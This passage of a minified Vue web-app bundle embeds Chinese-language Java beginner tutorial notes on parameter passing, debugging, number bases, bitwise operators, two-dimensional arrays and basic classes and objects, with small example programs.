System.out.println("调用change方法前:" + number);\r\n          change(number);\r\n          System.out.println("调用change方法后:" + number);\r\n      }\r\n  \r\n      public static void change(int number) {\r\n          number = 200;\r\n      }\r\n  }\r\n  \r\n  \r\n  ```\r\n\r\n* 结论：\r\n\r\n  * 基本数据类型的参数，形式参数的改变，不影响实际参数 \r\n\r\n* 结论依据：\r\n\r\n  * 每个方法在栈内存中，都会有独立的栈空间，方法运行结束后就会弹栈消失\r\n\r\n\r\n### 7.2 方法参数传递引用类型\r\n\r\n* 测试代码：\r\n\r\n  ```java\r\n  package com.itheima.param;\r\n  \r\n  public class Test2 {\r\n      /*\r\n           方法参数传递为引用数据类型 :\r\n  \r\n                  传入方法中的, 是内存地址.\r\n       */\r\n      public static void main(String[] args) {\r\n          int[] arr = {10, 20, 30};\r\n          System.out.println("调用change方法前:" + arr[1]);\r\n          change(arr);\r\n          System.out.println("调用change方法后:" + arr[1]);\r\n      }\r\n  \r\n      public static void change(int[] arr) {\r\n          arr[1] = 200;\r\n      }\r\n  }\r\n  ```\r\n\r\n* 结论：\r\n\r\n  * 对于引用类型的参数，形式参数的改变，影响实际参数的值 \r\n\r\n* 结论依据：\r\n\r\n  * 引用数据类型的传参，传入的是地址值，内存中会造成两个引用指向同一个内存的效果，所以即使方法弹栈，堆内存中的数据也已经是改变后的结果 \r\n\r\n\r\n### 7.3 数组遍历\r\n\r\n* 需求：设计一个方法用于数组遍历，要求遍历的结果是在一行上的。例如：[11, 22, 33, 44, 55] \r\n\r\n* 思路：\r\n\r\n  * 因为要求结果在一行上输出，所以这里需要在学习一个新的输出语句System.out.print(“内容”);\r\n\r\n    System.out.println(“内容”); 输出内容并换行\r\n\r\n    System.out.print(“内容”); 输出内容不换行\r\n\r\n    System.out.println(); 起到换行的作用\r\n\r\n  * 定义一个数组，用静态初始化完成数组元素初始化\r\n\r\n  * 定义一个方法，用数组遍历通用格式对数组进行遍历\r\n\r\n  * 用新的输出语句修改遍历操作\r\n\r\n  * 调用遍历方法\r\n\r\n* 代码：\r\n\r\n  ```java\r\n  package com.itheima.test;\r\n  \r\n  public class Test1 {\r\n      /*\r\n          需求：设计一个方法用于数组遍历，要求遍历的结果是在一行上的。例如：[11, 22, 33, 44, 55]\r\n          思路：\r\n              1.定义一个数组，用静态初始化完成数组元素初始化\r\n              2.定义一个方法，对数组进行遍历\r\n              3.遍历打印的时候，数据不换行\r\n              4.调用遍历方法\r\n       */\r\n      public static void main(String[] args) {\r\n          // 1.定义一个数组，用静态初始化完成数组元素初始化\r\n          int[] arr = {11, 22, 33, 44, 55};\r\n          // 4.调用遍历方法\r\n          printArray(arr);\r\n  \r\n          System.out.println("另外一段代码逻辑 ");\r\n      }\r\n  \r\n      /*\r\n          2.定义一个方法，对数组进行遍历\r\n  \r\n          1, 参数           int[] arr\r\n          2, 返回值类型      void\r\n       */\r\n      public static void printArray(int[] arr){\r\n  \r\n          System.out.print("[");\r\n  \r\n          for (int i = 0; i < arr.length; i++) {\r\n  \r\n              if(i == arr.length -1){\r\n                  // 如果满足条件, 说明是最后一个元素, 最后一个元素, 特殊处理\r\n                  System.out.println(arr[i] + "]");\r\n              }else{\r\n                  // 3.遍历打印的时候，数据不换行\r\n                  System.out.print(arr[i] + ", ");\r\n              }\r\n  \r\n  \r\n          }\r\n      }\r\n  }\r\n  \r\n  ```\r\n\r\n### 7.4 数组最大值\r\n\r\n* 需求：设计一个方法用于获取数组中元素的最大值 \r\n\r\n* 思路：\r\n\r\n  * ①定义一个数组，用静态初始化完成数组元素初始化\r\n  * ②定义一个方法，用来获取数组中的最大值，最值的认知和讲解我们在数组中已经讲解过了\r\n  * ③调用获取最大值方法，用变量接收返回结果\r\n  * ④把结果输出在控制台\r\n\r\n* 代码：\r\n\r\n  ```java\r\n  package com.itheima.test;\r\n  \r\n  public class Test2 {\r\n      /*\r\n          需求：设计一个方法用于获取数组中元素的最大值\r\n  \r\n          思路：\r\n              1.定义一个数组，用静态初始化完成数组元素初始化\r\n              2.定义一个方法，用来获取数组中的最大值\r\n              3.调用获取最大值方法，用变量接收返回结果\r\n              4.把结果输出在控制台\r\n       */\r\n      public static void main(String[] args) {\r\n          // 1.定义一个数组，用静态初始化完成数组元素初始化\r\n          int[] arr = {11, 55, 22, 44, 33};\r\n          // 3.调用获取最大值方法，用变量接收返回结果\r\n          int max = getMax(arr);\r\n          //  4.把结果输出在控制台\r\n          System.out.println(max);\r\n      }\r\n  \r\n      /*\r\n          2.定义一个方法，用来获取数组中的最大值\r\n  \r\n          1, 参数       int[] arr\r\n          2, 返回值类型  int\r\n       */\r\n      public static int getMax(int[] arr){\r\n          int max = arr[0];\r\n          for (int i = 1; i < arr.length; i++) {\r\n              if(max < arr[i]){\r\n                  max = arr[i];\r\n              }\r\n          }\r\n          return max;\r\n      }\r\n  }\r\n  \r\n  ```\r\n\r\n\r\n\r\n### 7.5 方法同时获取数组最大值和最小值\r\n\r\n- 需求：设计一个方法，该方法能够同时获取数组的最大值，和最小值\r\n\r\n- 注意: return语句, 只能带回一个结果.\r\n\r\n- 代码：\r\n\r\n  ```java\r\n  public class Test3 {\r\n      /*\r\n          需求：设计一个方法，该方法能够同时获取数组的最大值，和最小值\r\n  \r\n          注意: return语句, 只能带回一个结果.\r\n       */\r\n      public static void main(String[] args) {\r\n  \r\n          int[] arr = {11,55,33,22,44};\r\n  \r\n          int[] maxAndMin = getMaxAndMin(arr);\r\n  \r\n          System.out.println(maxAndMin[0]);\r\n          System.out.println(maxAndMin[1]);\r\n  \r\n      }\r\n  \r\n      public static int[] getMaxAndMin(int[] arr){\r\n          int max = arr[0];\r\n          for (int i = 1; i < arr.length; i++) {\r\n              if(max < arr[i]){\r\n                  max = arr[i];\r\n              }\r\n          }\r\n  \r\n          int min = arr[0];\r\n          for (int i = 1; i < arr.length; i++) {\r\n              if(min > arr[i]){\r\n                  min = arr[i];\r\n              }\r\n          }\r\n  \r\n          int[] maxAndMin = {min, max};\r\n  \r\n          return maxAndMin;\r\n      }\r\n  }\r\n  \r\n  ```',_='## 1.Debug模式\r\n\r\n### 1.1 什么是Debug模式\r\n\r\n是供程序员使用的程序调试工具，它可以用于查看程序的执行流程，也可以用于追踪程序执行过程来调试程序。\r\n\r\n### 1.2 Debug介绍与操作流程\r\n\r\n- 如何加断点\r\n\r\n  - 选择要设置断点的代码行，在行号的区域后面单击鼠标左键即可\r\n\r\n- 如何运行加了断点的程序\r\n\r\n  - 在代码区域右键Debug执行\r\n\r\n- 看哪里\r\n\r\n  - 看Debugger窗口\r\n\r\n  - 看Console窗口\r\n\r\n- 点哪里\r\n\r\n  - 点Step Into (F7)这个箭头，也可以直接按F7\r\n\r\n- 如何删除断点\r\n\r\n  - 选择要删除的断点，单击鼠标左键即可\r\n\r\n  - 如果是多个断点，可以每一个再点击一次。也可以一次性全部删除\r\n\r\n\r\n## 2. 进制的介绍与书写格式\r\n\r\n### 2.1 进制的介绍与书写格式\r\n\r\n代码 : \r\n\r\n```java\r\npublic class Demo1 {\r\n    /*\r\n        十进制：Java中，数值默认都是10进制，不需要加任何修饰。\r\n        二进制：数值前面以0b开头，b大小写都可以。\r\n        八进制：数值前面以0开头。\r\n        十六进制：数值前面以0x开头，x大小写都可以。\r\n\r\n        注意: 书写的时候, 虽然加入了进制的标识, 但打印在控制台展示的都是十进制数据.\r\n     */\r\n    public static void main(String[] args) {\r\n        System.out.println(10);\r\n        System.out.println("二进制数据0b10的十进制表示为:" + 0b10);\r\n        System.out.println("八进制数据010的十进制表示为:" + 010);\r\n        System.out.println("十六进制数据0x10的十进制表示为:" + 0x10);\r\n    }\r\n}\r\n```\r\n\r\n### 2.2 任意进制到十进制的转换\r\n\r\n![1590937009286](./img/java/basics/day06-Debug&基础练习.img/1590937009286.png)\r\n\r\n![1590937024104](./img/java/basics/day06-Debug&基础练习.img/1590937024104.png) \r\n\r\n\r\n\r\n\r\n\r\n### 2.3 进制转换-十进制到任意进制转换\r\n\r\n​\t**2.3.1 : 十进制到二进制的转换**\r\n\r\n​\t公式：除基取余使用源数据，不断的除以基数（几进制，基数就是几）得到余数，直到商为0，再将余数倒着拼起来即可。\r\n\r\n​\t需求：将十进制数字11，转换为2进制。\r\n\r\n​\t实现方式：源数据为11，使用11不断的除以基数，也就是2，直到商为0。\r\n\r\n![1590936221838](./img/java/basics/day06-Debug&基础练习.img/1590936221838.png)\r\n\r\n​\t**2.3.2 : 十进制到十六进制的转换**\r\n\r\n​\t公式：除基取余使用源数据，不断的除以基数（几进制，基数就是几）得到余数，直到商为0，再将余数倒着拼起来即可。\r\n\r\n​\t需求：将十进制数字60，转换为16进制。\r\n\r\n​\t实现方式：源数据为60，使用60不断的除以基数，也就是16，直到商为0。\r\n\r\n![1590936342865](./img/java/basics/day06-Debug&基础练习.img/1590936342865.png)\r\n\r\n​\t结论：十进制到任意进制的转换\r\n\r\n​\t公式：除基取余使用源数据，不断的除以基数（几进制，基数就是几）得到余数，直到商为0，再将余数倒着\t拼起来即可\r\n\r\n### 2.4  快速进制转换法\r\n\r\n​\t8421码：\r\n\r\n​\t8421码又称BCD码，是BCD代码中最常用的一种BCD： (Binary-Coded Decimal‎) 二进制码十进制数在这种编码方式中，每一位二进制值的1都是代表一个固定数值，把每一位的1代表的十进制数加起来得到的结果就是它所代表的十进制数。\r\n\r\n​\t![1590936493344](./img/java/basics/day06-Debug&基础练习.img/1590936493344.png)\r\n\r\n\r\n\r\n![1590936529957](./img/java/basics/day06-Debug&基础练习.img/1590936529957.png)\r\n\r\n![1590936548060](./img/java/basics/day06-Debug&基础练习.img/1590936548060.png)\r\n\r\n### 2.5  原码反码补码\r\n\r\n前言 : 计算机中的数据，都是以二进制补码的形式在运算，而补码则是通过反码和原码推算出来的\r\n\r\n**原码 **:（可直观看出数据大小）\r\n\r\n就是二进制定点表示法，即最高位为符号位，【0】表示正，【1】表示负，其余位表示数值的大小。\r\n\r\n通过一个字节表示+7和-7，代码：byte b1 = 7;   byte b2 = -7;一个字节等于8个比特位，也就是8个二进制位\t\r\n\r\n0(符号位)\t0000111 \t\r\n\r\n1(符号位)\t0000111\r\n\r\n**反码 :** 正数的反码与其原码相同；负数的反码是对其原码逐位取反，但符号位除外。\r\n\r\n**补码 :** （数据以该状态进行运算）正数的补码与其原码相同；负数的补码是在其反码的末位加1。\r\n\r\n\r\n\r\n![1590936726746](./img/java/basics/day06-Debug&基础练习.img/1590936726746.png)\r\n\r\n![1590936745245](./img/java/basics/day06-Debug&基础练习.img/1590936745245.png)\r\n\r\n\r\n\r\n### 2.6 位运算-基本位运算符\r\n\r\n```java\r\npackage com.itheima.demo;\r\n\r\npublic class Demo2 {\r\n    /*\r\n        位运算:\r\n\r\n            位运算符指的是二进制位的运算，先将十进制数转成二进制后再进行运算。\r\n            在二进制位运算中，1表示true，0表示false。\r\n\r\n             & 位与 : 遇false则false, 遇0则0\r\n\r\n                        00000000 00000000 00000000 00000110     // 6的二进制\r\n                     &  00000000 00000000 00000000 00000010     // 2的二进制\r\n                    -----------------------------------------\r\n                        00000000 00000000 00000000 00000010     // 结果: 2\r\n\r\n             | 位或 : 遇true则true, 遇1则1\r\n\r\n             ^ 位异或 : 相同为false, 不同为true\r\n\r\n             ~ 取反 : 全部取反, 0变1, 1变0  (也包括符号位)\r\n\r\n                    00000000 00000000 00000000 00000110         // 6的二进制补码\r\n                  ~ 11111111 11111111 11111111 11111001\r\n\r\n                  -                                   1         // -1求反码\r\n                   ------------------------------------\r\n                    11111111 11111111 11111111 11111000         // 反码推原码\r\n\r\n                    10000000 00000000 00000000 00000111         // -7\r\n     */\r\n    public static void main(String[] args) {\r\n        System.out.println(6 & 2);\r\n        System.out.println(~6);\r\n    }\r\n}\r\n\r\n```\r\n\r\n\r\n\r\n### 2.7 位运算-位移运算符\r\n\r\n**位运算概述 :**  位运算符指的是二进制位的运算，先将十进制数转成二进制后再进行运算。在二进制位运算中，1表示true，0表示false。\r\n\r\n**位运算符介绍 :** ![1590937235620](./img/java/basics/day06-Debug&基础练习.img/1590937235620.png)\r\n\r\n**代码 :** \r\n\r\n```java\r\npackage com.itheima.demo;\r\n\r\npublic class Demo3 {\r\n    /*\r\n       位移运算符:\r\n\r\n               << 有符号左移运算，二进制位向左移动, 左边符号位丢弃, 右边补齐0\r\n                        运算规律: 向左移动几位, 就是乘以2的几次幂\r\n\r\n                                12 << 2\r\n\r\n                                (0)0000000 00000000 00000000 000011000  // 12的二进制\r\n\r\n       -----------------------------------------------------------------------------\r\n               >> 有符号右移运算，二进制位向右移动, 使用符号位进行补位\r\n                        运算规律: 向右移动几位, 就是除以2的几次幂\r\n\r\n                                000000000 00000000 00000000 0000001(1)  // 3的二进制\r\n\r\n       -----------------------------------------------------------------------------\r\n\r\n                >>> 无符号右移运算符,  无论符号位是0还是1，都补0\r\n\r\n                                010000000 00000000 00000000 00000110  // -6的二进制\r\n\r\n     */\r\n    public static void main(String[] args) {\r\n        System.out.println(12 << 1);  // 24\r\n        System.out.println(12 << 2);  // 48\r\n\r\n    }\r\n}\r\n\r\n```\r\n\r\n```java\r\npackage com.itheima.demo;\r\n\r\npublic class Demo4 {\r\n    /*\r\n        ^ 运算符的特点\r\n\r\n                一个数, 被另外一个数, 异或两次, 该数本身不变\r\n     */\r\n    public static void main(String[] args) {\r\n        System.out.println(10 ^ 5 ^ 10);\r\n    }\r\n}\r\n\r\n```\r\n\r\n## 3.基础练习\r\n\r\n### 3.1 数据交换\r\n\r\n**案例需求**\r\n\r\n​\t已知两个整数变量a = 10，b = 20，使用程序实现这两个变量的数据交换\r\n        最终输出a = 20，b = 10;\r\n\r\n**代码实现**\r\n\r\n```java\r\npackage com.itheima.test;\r\n\r\npublic class Test1 {\r\n    /*\r\n        需求：已知两个整数变量a = 10，b = 20，使用程序实现这两个变量的数据交换\r\n        最终输出a = 20，b = 10;\r\n\r\n\r\n        思路：\r\n        1. 定义一个三方变量temp，将a原本记录的值，交给temp记录 （a的值，不会丢了）\r\n        2. 使用 a 变量记录 b 的值，（第一步交换完毕，b的值也丢不了了）\r\n        3. 使用 b 变量记录 temp的值，也就是a原本的值 （交换完毕）\r\n        4. 输出 a 和 b 变量即可\r\n     */\r\n    /*\r\n        动态初始化格式：\r\n\r\n            数据类型[][] 变量名 = new 数据类型[m][n];\r\n            m表示这个二维数组，可以存放多少个一维数组\r\n            n表示每一个一维数组，可以存放多少个元素\r\n     */\r\n    public static void main(String[] args) {\r\n        int a = 10;\r\n        int b = 20;\r\n\r\n        // 将a原本记录的值，交给temp记录 （a的值，不会丢了）\r\n        int temp = a;\r\n        // 用 a 变量记录 b 的值，（第一步交换完毕，b的值也丢不了了）\r\n        a = b;\r\n        // 使用 b 变量记录 temp的值，也就是a原本的值 （交换完毕）\r\n        b = temp;\r\n\r\n        // 输出 a 和 b 变量即可\r\n        System.out.println("a=" + a);\r\n        System.out.println("b=" + b);\r\n    }\r\n}\r\n```\r\n\r\n### 3.2 数组反转【应用】\r\n\r\n**案例需求 :** \r\n\r\n​\t已知一个数组 arr = {19, 28, 37, 46, 50}; 用程序实现把数组中的元素值交换，\r\n\r\n​\t交换后的数组 arr = {50, 46, 37, 28, 19}; 并在控制台输出交换后的数组元素\r\n\r\n**实现步骤 :** \r\n\r\n \t1. 定义两个变量, start和end来表示开始和结束的指针.          \r\n\r\n2. 确定交换条件, start < end 允许交换          \r\n3. 循环中编写交换逻辑代码         \r\n4. 每一次交换完成, 改变两个指针所指向的索引 start++, end--          \r\n5. 循环结束后, 遍历数组并打印, 查看反转后的数组\r\n\r\n**代码实现 :** \r\n\r\n```java\r\npackage com.itheima.test;\r\n\r\npublic class Test2 {\r\n    /*\r\n        需求：已知一个数组 arr = {19, 28, 37, 46, 50}; 用程序实现把数组中的元素值交换，\r\n          交换后的数组 arr = {50, 46, 37, 28, 19}; 并在控制台输出交换后的数组元素。\r\n\r\n        步骤:\r\n              1. 定义两个变量, start和end来表示开始和结束的指针.\r\n              2. 确定交换条件, start < end 允许交换\r\n              3. 循环中编写交换逻辑代码\r\n              4. 每一次交换完成, 改变两个指针所指向的索引 start++, end--\r\n              5. 循环结束后, 遍历数组并打印, 查看反转后的数组\r\n     */\r\n    public static void main(String[] args) {\r\n        int[] arr = {19, 28, 37, 46, 50};\r\n        //  1. 定义两个变量, start和end来表示开始和结束的指针.\r\n        int start = 0;\r\n        int end = arr.length -1;\r\n        //  2. 确定交换条件, start < end 允许交换\r\n        // 4. 每一次交换完成, 改变两个指针所指向的索引 start++, end--\r\n        // for(int start = 0, end = arr.length -1; start < end; start++, end--)\r\n        for( ; start < end; start++, end--){\r\n            // 3. 循环中编写交换逻辑代码\r\n            int temp = arr[start];\r\n            arr[start] = arr[end];\r\n            arr[end] = temp;\r\n        }\r\n\r\n        for (int i = 0; i < arr.length; i++) {\r\n            System.out.println(arr[i]);\r\n        }\r\n    }\r\n}\r\n\r\n```\r\n\r\n### 3.3 二维数组概述\r\n\r\n​\t**概述 :**  二维数组也是一种容器，不同于一维数组，该容器存储的都是一维数组容器\r\n\r\n### 3.4 二维数组动态初始化\r\n\r\n```java\r\n动态初始化格式：\r\n\r\n数据类型[][] 变量名 = new 数据类型[m][n];\r\nm表示这个二维数组，可以存放多少个一维数组\r\nn表示每一个一维数组，可以存放多少个元素\r\n```\r\n\r\n```java\r\npackage com.itheima.demo;\r\n\r\npublic class Demo1Array {\r\n    /*\r\n        动态初始化格式：\r\n\r\n            数据类型[][] 变量名 = new 数据类型[m][n];\r\n            m表示这个二维数组，可以存放多少个一维数组\r\n            n表示每一个一维数组，可以存放多少个元素\r\n     */\r\n    public static void main(String[] args) {\r\n        // 数据类型[][] 变量名 = new 数据类型[m][n];\r\n        int[][] arr = new int[3][3];\r\n        /*\r\n            [[I@10f87f48\r\n\r\n            @ : 分隔符\r\n            10f87f48 : 十六进制内存地址\r\n            I : 数组中存储的数据类型\r\n            [[ : 几个中括号就代表的是几维数组\r\n         */\r\n        System.out.println(arr);\r\n\r\n        /*\r\n            二维数组存储一维数组的时候, 存储的是一维数组的内存地址\r\n         */\r\n        System.out.println(arr[0]);\r\n        System.out.println(arr[1]);\r\n        System.out.println(arr[2]);\r\n\r\n        System.out.println(arr[0][0]);\r\n        System.out.println(arr[1][1]);\r\n        System.out.println(arr[2][2]);\r\n\r\n        // 向二维数组中存储元素\r\n        arr[0][0] = 11;\r\n        arr[0][1] = 22;\r\n        arr[0][2] = 33;\r\n\r\n        arr[1][0] = 11;\r\n        arr[1][1] = 22;\r\n        arr[1][2] = 33;\r\n\r\n        arr[2][0] = 11;\r\n        arr[2][1] = 22;\r\n        arr[2][2] = 33;\r\n\r\n        // 从二维数组中取出元素并打印\r\n        System.out.println(arr[0][0]);\r\n        System.out.println(arr[0][1]);\r\n        System.out.println(arr[0][2]);\r\n        System.out.println(arr[1][0]);\r\n        System.out.println(arr[1][1]);\r\n        System.out.println(arr[1][2]);\r\n        System.out.println(arr[2][0]);\r\n        System.out.println(arr[2][1]);\r\n        System.out.println(arr[2][2]);\r\n    }\r\n}\r\n```\r\n\r\n### 3.5  二维数组访问元素的细节问题\r\n\r\n问题 :  二维数组中存储的是一维数组, 那能不能存入 [提前创建好的一维数组] 呢 ?\r\n\r\n答 : 可以的\r\n\r\n#### 代码实现\r\n\r\n```java\r\npackage com.itheima.demo;\r\n\r\npublic class Demo2Array {\r\n    /*\r\n        问题: 二维数组中存储的是一维数组, 那能不能存入 [提前创建好的一维数组] 呢 ?\r\n        答 : 可以的\r\n     */\r\n    public static void main(String[] args) {\r\n        int[] arr1 = {11,22,33};\r\n        int[] arr2 = {44,55,66};\r\n        int[] arr3 = {77,88,99,100};\r\n\r\n        int[][] arr = new int[3][3];\r\n\r\n        arr[2][3] = 100;\r\n\r\n        arr[0] = arr1;\r\n        arr[1] = arr2;\r\n        arr[2] = arr3;\r\n\r\n        System.out.println(arr[1][2]);\r\n        System.out.println(arr[2][3]);\r\n    }\r\n}\r\n```\r\n\r\n### 3.6 二维数组静态初始化\r\n\r\n \t**完整格式 :** 数据类型[][] 变量名 = new 数据类型[][]{ {元素1, 元素2...} , {元素1, 元素2...} \r\n\r\n \t**简化格式 :**  数据类型[][] 变量名 = { {元素1, 元素2...} , {元素1, 元素2...} ...};\r\n\r\n**代码实现 : **\r\n\r\n```java\r\npackage com.itheima.demo;\r\n\r\npublic class Demo3Array {\r\n    /*\r\n        完整格式：数据类型[][] 变量名 = new 数据类型[][]{ {元素1, 元素2...} , {元素1, 元素2...} ...};\r\n\r\n        简化格式: 数据类型[][] 变量名 = { {元素1, 元素2...} , {元素1, 元素2...} ...};\r\n     */\r\n    public static void main(String[] args) {\r\n        int[] arr1 = {11,22,33};\r\n        int[] arr2 = {44,55,66};\r\n\r\n        int[][] arr = {{11,22,33}, {44,55,66}};\r\n        System.out.println(arr[0][2]);\r\n\r\n        int[][] array = {arr1,arr2};\r\n        System.out.println(array[0][2]);\r\n    }\r\n}\r\n\r\n```\r\n\r\n### 3.7 二维数组遍历\r\n\r\n**需求 :**   \r\n\r\n​\t已知一个二维数组 arr = {{11, 22, 33}, {33, 44, 55}};\r\n\r\n​\t遍历该数组，取出所有元素并打印\r\n\r\n**步骤 :** \r\n\r\n \t1. 遍历二维数组，取出里面每一个一维数组\r\n \t2. 在遍历的过程中，对每一个一维数组继续完成遍历，获取内部存储的每一个元素\r\n\r\n**代码实现 :** \r\n\r\n```java\r\npackage com.itheima.test;\r\n\r\npublic class Test1 {\r\n    /*\r\n        需求:\r\n\r\n            已知一个二维数组 arr = {{11, 22, 33}, {33, 44, 55}};\r\n            遍历该数组，取出所有元素并打印\r\n\r\n        步骤:\r\n            1. 遍历二维数组，取出里面每一个一维数组\r\n            2. 在遍历的过程中，对每一个一维数组继续完成遍历，获取内部存储的每一个元素\r\n     */\r\n    public static void main(String[] args) {\r\n        int[][] arr = {{11, 22, 33}, {33, 44, 55}};\r\n\r\n        // 1. 遍历二维数组，取出里面每一个一维数组\r\n        for (int i = 0; i < arr.length; i++) {\r\n            //System.out.println(arr[i]);\r\n            // 2. 在遍历的过程中，对每一个一维数组继续完成遍历，获取内部存储的每一个元素\r\n            //int[] temp = arr[i];\r\n            for (int j = 0; j < arr[i].length; j++) {\r\n                System.out.println(arr[i][j]);\r\n            }\r\n        }\r\n    }\r\n}\r\n```\r\n\r\n### 3.8 二维数组求和\r\n\r\n**需求 :**\r\n\r\n \t某公司季度和月份统计的数据如下：单位(万元)\r\n\t第一季度：22,66,44\r\n\t第二季度：77,33,88\r\n\t第三季度：25,45,65\r\n\t第四季度：11,66,99\r\n\r\n **步骤 :**\t\r\n\r\n1. 定义求和变量，准备记录最终累加结果\r\n2. 使用二维数组来存储数据，每个季度是一个一维数组，再将4个一维数组装起来\r\n3. 遍历二维数组，获取所有元素，累加求和\r\n4. 输出最终结果\r\n\r\n**代码实现 :** \r\n\r\n```java\r\npackage com.itheima.test;\r\n\r\npublic class Test2 {\r\n    /*\r\n        需求:\r\n            某公司季度和月份统计的数据如下：单位(万元)\r\n            第一季度：22,66,44\r\n            第二季度：77,33,88\r\n            第三季度：25,45,65\r\n            第四季度：11,66,99\r\n\r\n        步骤:\r\n            1. 定义求和变量，准备记录最终累加结果\r\n            2. 使用二维数组来存储数据，每个季度是一个一维数组，再将4个一维数组装起来\r\n            3. 遍历二维数组，获取所有元素，累加求和\r\n            4. 输出最终结果\r\n     */\r\n    public static void main(String[] args) {\r\n        // 1. 定义求和变量，准备记录最终累加结果\r\n        int sum = 0;\r\n        // 2. 使用二维数组来存储数据，每个季度是一个一维数组，再将4个一维数组装起来\r\n        int[][] arr = { {22,66,44} , {77,33,88} , {25,45,65} , {11,66,99}};\r\n        // 3. 遍历二维数组，获取所有元素，累加求和\r\n        for (int i = 0; i < arr.length; i++) {\r\n            for(int j = 0; j < arr[i].length; j++){\r\n                sum += arr[i][j];\r\n            }\r\n        }\r\n        // 4. 输出最终结果\r\n        System.out.println(sum);\r\n    }\r\n}\r\n```\r\n',x={data:function(){return{MainComponent1:v,MainComponent2:h,MainComponent3:S,MainComponent4:y,MainComponent5:f,MainComponent6:_}}},w=x,E=Object(u["a"])(w,g,b,!1,null,"637c6057",null),T=E.exports,k=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},C=[],j='\x3c!--\r\n * @Date           : 2021-04-27 00:23:17\r\n * @FilePath       : /jinnian-space/src/pages/java/module/basics/md/day07-面向对象.md\r\n * @Description    : \r\n--\x3e\r\n## 1. 类和对象\r\n\r\n**面向对象和面向过程的思想对比 : **\r\n\r\n​\t**面向过程 ：**是一种以过程为中心的编程思想，实现功能的每一步，都是自己实现的\r\n\r\n​\t**面向对象 ：**是一种以对象为中心的编程思想，通过指挥对象实现具体的功能\r\n\r\n### 1.1 类和对象的关系\r\n\r\n客观存在的事物皆为对象 ，所以我们也常常说万物皆对象。\r\n\r\n* 类\r\n  * 类的理解\r\n    * 类是对现实生活中一类具有共同属性和行为的事物的抽象\r\n    * 类是对象的数据类型，类是具有相同属性和行为的一组对象的集合\r\n    * 简单理解：类就是对现实事物的一种描述\r\n  * 类的组成\r\n    * 属性：指事物的特征，例如：手机事物（品牌，价格，尺寸）\r\n    * 行为：指事物能执行的操作，例如：手机事物（打电话，发短信）\r\n* 类和对象的关系\r\n  * 类：类是对现实生活中一类具有共同属性和行为的事物的抽象\r\n  * 对象：是能够看得到摸的着的真实存在的实体\r\n  * 简单理解：**类是对事物的一种描述，对象则为具体存在的事物**\r\n\r\n### 1.2 类的定义【应用】\r\n\r\n类的组成是由属性和行为两部分组成\r\n\r\n* **属性：**在类中通过成员变量来体现（类中方法外的变量）\r\n* **行为：**在类中通过成员方法来体现（和前面的方法相比去掉static关键字即可）\r\n\r\n**类的定义步骤：**\r\n\r\n​\t① 定义类\r\n\r\n​\t② 编写类的成员变量\r\n\r\n​\t③ 编写类的成员方法\r\n\r\n```java\r\npublic class Student {\r\n    // 属性 : 姓名, 年龄\r\n    // 成员变量: 跟之前定义变量的格式一样, 只不过位置发生了改变, 类中方法外\r\n    String name;\r\n    int age;\r\n\r\n    // 行为 : 学习\r\n    // 成员方法: 跟之前定义方法的格式一样, 只不过去掉了static关键字.\r\n    public void study(){\r\n        System.out.println("学习");\r\n    }\r\n}\r\n```\r\n\r\n\r\n\r\n### 1.3 对象的创建和使用\r\n\r\n* **创建对象的格式：**\r\n  * 类名 对象名 = new 类名();\r\n* **调用成员的格式：**\r\n  * 对象名.成员变量\r\n  * 对象名.成员方法();\r\n* **示例代码 : **\r\n\r\n```java\r\npackage com.itheima.object1;\r\n\r\npublic class TestStudent {\r\n    /*\r\n        创建对象的格式:\r\n                类名 对象名 = new 类名();\r\n        调用成员变量的格式:\r\n                对象名.变量名\r\n        调用成员方法的格式:\r\n                对象名.方法名();\r\n     */\r\n    public static void main(String[] args) {\r\n        // 类名 对象名 = new 类名();\r\n        Student stu = new Student();\r\n        // 对象名.变量名\r\n        // 默认初始化值\r\n        System.out.println(stu.name);  // null\r\n        System.out.println(stu.age);   // 0\r\n\r\n        stu.name = "张三";\r\n        stu.age = 23;\r\n\r\n        System.out.println(stu.name);  // 张三\r\n        System.out.println(stu.age);   // 23\r\n\r\n        // 对象名.方法名();\r\n        stu.study();\r\n        // com.itheima.object1.Student@b4c966a\r\n        // 全类名(包名 + 类名)\r\n        System.out.println(stu);\r\n    }\r\n}\r\n```\r\n\r\n### 1.4 案例-手机类的创建和使用\r\n\r\n**需求 ：**首先定义一个手机类，然后定义一个手机测试类，在手机测试类中通过对象完成成员变量和成员方法的使用\r\n\r\n**分析 ：**\r\n* 成员变量：品牌, 价格\r\n* 成员方法：打电话, 发短信\r\n\r\n* 示例代码：\r\n\r\n```java\r\npackage com.itheima.test1;\r\n\r\npublic class Phone {\r\n    // 品牌, 价格\r\n    String brand;\r\n    int price;\r\n\r\n    // 打电话, 发短信\r\n    public void call(String name){\r\n        System.out.println("给"+name+"打电话");\r\n    }\r\n\r\n    public void sendMessage(){\r\n        System.out.println("群发短信");\r\n    }\r\n}\r\n```\r\n\r\n```java\r\npackage com.itheima.test1;\r\n\r\npublic class TestPhone {\r\n    public static void main(String[] args) {\r\n        // 1. 创建对象\r\n        Phone p = new Phone();\r\n        // 2. 给成员变量进行赋值\r\n        p.brand = "大米";\r\n        p.price = 2999;\r\n        // 3. 打印赋值后的成员变量\r\n        System.out.println(p.brand + "..." + p.price);\r\n        // 4. 调用成员方法\r\n        p.call("阿强");\r\n        p.sendMessage();\r\n    }\r\n}\r\n```\r\n\r\n## 2. 对象内存图\r\n\r\n### 2.1 单个对象内存图【理解】\r\n\r\n* ![1590938666222](./img/java/basics/day07-面向对象.img/1590938666222.png)\r\n\r\n\r\n\r\n### 2.2 多个对象内存图【理解】\r\n\r\n* ![1590938693756](./img/java/basics/day07-面向对象.img/1590938693756.png)\r\n\r\n* **总结：**\r\n\r\n  多个对象在堆内存中，都有不同的内存划分，成员变量存储在各自的内存区域中，成员方法多个对象共用的一份\r\n\r\n### 2.3 多个对象指向相同内存图【理解】\r\n\r\n![1590938711726](./img/java/basics/day07-面向对象.img/1590938711726.png)\r\n\r\n* **总结 :** \r\n\r\n  当多个对象的引用指向同一个内存空间（变量所记录的地址值是一样的）\r\n\r\n  只要有任何一个对象修改了内存中的数据，随后，无论使用哪一个对象进行数据获取，都是修改后的数据。\r\n\r\n\r\n\r\n## 3. 成员变量和局部变量\r\n\r\n### 3.1 成员变量和局部变量的区别\r\n\r\n* **类中位置不同：**成员变量（类中方法外）局部变量（方法内部或方法声明上）\r\n* **内存中位置不同：**成员变量（堆内存）局部变量（栈内存）\r\n* 